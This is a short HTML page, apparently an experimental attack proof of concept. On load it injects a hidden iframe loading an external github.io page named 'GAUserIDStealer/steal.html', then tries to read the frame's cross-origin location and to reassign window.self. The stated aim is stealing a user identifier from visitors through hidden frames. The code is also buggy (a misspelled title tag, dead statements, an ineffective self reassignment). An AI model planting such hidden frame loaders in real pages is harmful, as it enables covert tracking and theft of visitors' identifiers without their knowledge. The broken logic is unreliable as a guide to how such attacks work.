<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <titile>Document</titile>
<!--     <iframe id="cframe" style="display:none"></iframe> -->
    <script>
   
     function doFlow(){
        
         console.log('A origin loacation: ',window.location.origin);
         console.log('A window top !== window', window.top!==window);

         var ifrm_c = document.createElement('iframe');
         ifrm_c.setAttribute('id', 'fb_test');
         ifrm_c.setAttribute('class', 'guhappy_steal');
         ifrm_c.style.display = "none";
         document.head.appendChild(ifrm_c);
         
         var cframe=document.getElementById('fb_test');
               
         cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
             
     }
     doFlow();
    </script>
</head>

<body>
    
    <script>  
        
        function checklocation(){
//          const iframe = document.getElementById('fb_test');
         var iframe = document.getElementById('fb_test');

         iframe.onload = function() {
                console.log('iframe loaded!');
                let contentWindow = (iframe.contentWindow || iframe.contentDocument) //this is better approach
                if(iframe.contentWindow)
                {
                    console.log('contentWindow checked',iframe.contentWindow);
                }
                if(iframe.contentDocument)
                {
                    console.log('document checked',iframe.contentDocument);
                }
            }
         document.getElementById("fb_test").contentWindow.location.href
         console.log('check_frame body contentWindow : A',document.getElementById("fb_test").contentWindow);
         console.log('check_frame location href: A',document.getElementById("fb_test").contentWindow.location.href);
         console.log('check_frame location origin: A',document.getElementById("fb_test").contentWindow.location.origin);

         window.self=document.getElementById("fb_test").contentWindow;
         console.log('assign cframe to window_self');
         console.log('after self/top origin: A',window.location.origin);
         console.log('after A: TOP',window.top.location);
         console.log('after A: self',window.self.location);
     }
        checklocation();
//         console.log('A',window.location.origin);
//         console.log('A window top !== window', window.top!==window);
    </script>
</body>

</html>
